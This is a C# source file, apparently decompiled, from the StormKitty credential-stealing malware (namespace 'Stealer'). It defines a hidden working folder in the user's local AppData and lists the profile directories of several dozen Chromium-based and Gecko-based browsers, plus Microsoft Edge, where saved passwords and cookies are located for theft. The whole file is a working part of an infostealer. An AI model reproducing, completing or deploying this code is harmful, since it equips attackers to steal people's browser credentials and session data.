﻿using System;
using System.IO;
using StormKitty;
using StormKitty.Implant;

namespace Stealer
{
	// Token: 0x02000013 RID: 19
	internal sealed class Paths
	{
		// Token: 0x0600005F RID: 95 RVA: 0x000031F4 File Offset: 0x000013F4
		public static string InitWorkDir()
		{
			string text = Path.Combine(Paths.lappdata, StringsCrypt.GenerateRandomData(Config.Mutex));
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
				Startup.HideFile(text);
			}
			return text;
		}

		// Token: 0x04000058 RID: 88
		public static string[] sChromiumPswPaths = new string[]
		{
			"\\Chromium\\User Data\\",
			"\\Google\\Chrome\\User Data\\",
			"\\Google(x86)\\Chrome\\User Data\\",
			"\\Opera Software\\",
			"\\MapleStudio\\ChromePlus\\User Data\\",
			"\\Iridium\\User Data\\",
			"\\7Star\\7Star\\User Data\\",
			"\\CentBrowser\\User Data\\",
			"\\Chedot\\User Data\\",
			"\\Vivaldi\\User Data\\",
			"\\Kometa\\User Data\\",
			"\\Elements Browser\\User Data\\",
			"\\Epic Privacy Browser\\User Data",
			"\\uCozMedia\\Uran\\User Data\\",
			"\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\",
			"\\CatalinaGroup\\Citrio\\User Data\\",
			"\\Coowon\\Coowon\\User Data\\",
			"\\liebao\\User Data\\",
			"\\QIP Surf\\User Data\\",
			"\\Orbitum\\User Data\\",
			"\\Comodo\\Dragon\\User Data\\",
			"\\Amigo\\User\\User Data\\",
			"\\Torch\\User Data\\",
			"\\Yandex\\YandexBrowser\\User Data\\",
			"\\Comodo\\User Data\\",
			"\\360Browser\\Browser\\User Data\\",
			"\\Maxthon3\\User Data\\",
			"\\K-Melon\\User Data\\",
			"\\Sputnik\\Sputnik\\User Data\\",
			"\\Nichrome\\User Data\\",
			"\\CocCoc\\Browser\\User Data\\",
			"\\Uran\\User Data\\",
			"\\Chromodo\\User Data\\",
			"\\Mail.Ru\\Atom\\User Data\\",
			"\\BraveSoftware\\Brave-Browser\\User Data\\"
		};

		// Token: 0x04000059 RID: 89
		public static string[] sGeckoBrowserPaths = new string[]
		{
			"\\Mozilla\\Firefox",
			"\\Waterfox",
			"\\K-Meleon",
			"\\Thunderbird",
			"\\Comodo\\IceDragon",
			"\\8pecxstudios\\Cyberfox",
			"\\NETGATE Technologies\\BlackHaw",
			"\\Moonchild Productions\\Pale Moon",
		};

		// Token: 0x0400005A RID: 90
		public static string EdgePath = "\\Microsoft\\Edge\\User Data";

		// Token: 0x0400005B RID: 91
		public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x0400005C RID: 92
		public static string lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
	}
}
